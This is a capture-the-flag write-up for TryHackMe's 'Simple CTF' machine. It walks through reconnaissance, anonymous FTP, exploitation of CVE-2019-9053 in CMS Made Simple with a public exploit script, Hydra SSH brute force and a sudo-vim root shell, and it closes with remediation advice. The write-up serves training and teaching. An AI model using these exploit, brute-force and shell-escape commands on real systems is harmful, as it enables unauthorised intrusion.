# TryHackMe — Simple CTF

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **Date** | 2026-11-23 |
| **Skills** | Port scanning, anonymous FTP, web directory enumeration, SQL injection (CVE-2019-9053), password cracking, SSH brute force, sudo privilege escalation |

> Flags and passwords are redacted, following TryHackMe's write-up guidelines.

## Summary

The machine exposes FTP, HTTP and SSH on a non-standard port. A web directory hides **CMS Made Simple 2.2.8**, vulnerable to an unauthenticated time-based **SQL injection (CVE-2019-9053)** that leaks the admin's salted password hash. The cracked password is reused for the system user, which gives SSH access. That user can run `vim` as root with `sudo`, which leads straight to a root shell.

There is also a shortcut: a note left on the anonymous FTP server reveals the username and says the password is weak, so SSH brute force works too. I took the shortcut first and then went back for the intended path. Both are documented below, along with why the intended one matters more.

## 1. Reconnaissance

Two passes with nmap: a fast one over all ports, then a detailed one only on the ports that are open.

```bash
nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

```bash
nmap -sV -sC -p 21,80,2222 -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | Anonymous login allowed |
| 80 | Apache 2.4.18 (Ubuntu) | Default page; `robots.txt` disallows `/openemr-5_0_1_3` |
| 2222 | OpenSSH 7.2p2 | SSH moved off port 22 |

Nmap labelled port 2222 as "EtherNetIP-1" only from its port table. Version detection (`-sV`) shows it is really SSH, which is why the second pass is worth running.

## 2. FTP — anonymous access

```bash
ftp <TARGET>        # user: anonymous, empty password
ftp> passive        # the directory listing timed out over the VPN until passive mode was toggled
ftp> cd pub
ftp> get ForMitch.txt
```

The note says, in short, that a developer called **Mitch** reused the same weak password for the system user, and that it was cracked in seconds. That gives a likely username (`mitch`) and a hint about how weak the password is.

## 3. Web — finding the vulnerable application

The `/openemr-5_0_1_3` entry from `robots.txt` led nowhere. Directory enumeration found more:

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -o web.txt
```

`/simple` hosts **CMS Made Simple**, and the page footer gives the version: **2.2.8**.

```bash
searchsploit cms made simple 2.2.8
```

The result *CMS Made Simple < 2.2.10 - SQL Injection* (EDB-46635, **CVE-2019-9053**) covers this version.

## 4. Exploitation — CVE-2019-9053 (unauthenticated time-based SQLi)

The `m1_idlist` parameter of the News module is injectable. Because the injection is **time-based blind**, the exploit recovers data one character at a time by measuring how long the server takes to respond. That makes it slow, but it needs no authentication.

```bash
searchsploit -m 46635
python2 46635.py -u http://<TARGET>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

**Fixing the exploit:** the script is Python 2 and imports `termcolor`, which isn't installed for Python 2 on current Kali. That library only adds colours to the output, so instead of installing it I replaced the import with no-op functions:

```bash
sed -i 's/^from termcolor import .*/colored = lambda s, *a, **k: s\ncprint = lambda s, *a, **k: __import__("sys").stdout.write(str(s)+"\\n")/' 46635.py
```

Output (redacted):

```
[+] Salt for password found: <redacted>
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: <md5 hash>
[+] Password cracked: <redacted>
```

The hash is salted: `md5(salt + password)`. A salt stops precomputed rainbow tables from working, so the script has to hash every rockyou word together with the leaked salt. The password is so weak that this still takes seconds.

## 5. Initial access — SSH as mitch

As the FTP note warned, the CMS password is reused for the system account:

```bash
ssh mitch@<TARGET> -p 2222
```

The user flag is in `/home/mitch/user.txt`. `/home` also contains a second user, `sunbath`, whose home directory isn't readable by mitch.

### Alternative path: SSH brute force

With the username from the FTP note, Hydra finds the same password almost immediately:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 ssh://<TARGET>
```

It works here only because the box hands over a username and a password near the top of rockyou. On a real engagement this approach is noisy (thousands of auth attempts in the logs), can lock accounts out, and **doesn't identify the actual vulnerability**. A client report needs the SQL injection, not just "we got in".

## 6. Privilege escalation — sudo vim

```bash
sudo -l
# mitch may run /usr/bin/vim as root
```

Vim can run shell commands. If vim runs as root, those commands run as root too. GTFOBins lists this under *vi → Shell → Sudo*; vim inherits it from vi.

```bash
sudo vim -c ':!/bin/sh'
whoami   # root
```

The root flag is in `/root/root.txt`.

## Attack chain

```
nmap → FTP anonymous (hint: user mitch, weak password)
     → gobuster → /simple → CMS Made Simple 2.2.8
     → CVE-2019-9053 SQLi → salted hash → cracked
     → password reuse → SSH :2222 as mitch
     → sudo -l → vim → root shell
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Outdated CMS (2.2.8, SQLi) | Upgrade to 2.2.10 or later |
| Weak password, reused between web app and OS | Strong, unique passwords; MFA or key-only SSH |
| Anonymous FTP holding sensitive notes | Disable anonymous FTP or audit what it serves |
| `sudo` rights on `vim` | Never grant sudo on editors, pagers or interpreters; use `sudoedit` if editing is needed |
| SSH moved to port 2222 | Security through obscurity only; a full port scan finds it straight away |

## Lessons learned

- **Enumerate every service before attacking one.** I went for the FTP → brute force shortcut and skipped the web server, which hid the real vulnerability.
- **Run nmap twice:** a fast scan over all ports, then `-sV -sC` on the open ones. Port-name guesses like "EtherNetIP-1" mean nothing until version detection confirms them.
- **Old exploits often need small fixes.** Reading the script and removing a cosmetic dependency took one line, which was far quicker than fighting Python 2 packaging.
- **GTFOBins** has been redesigned: each technique now has *Unprivileged / Sudo / SUID* tabs, and some binaries (like vim) inherit their shell techniques from another binary (vi).
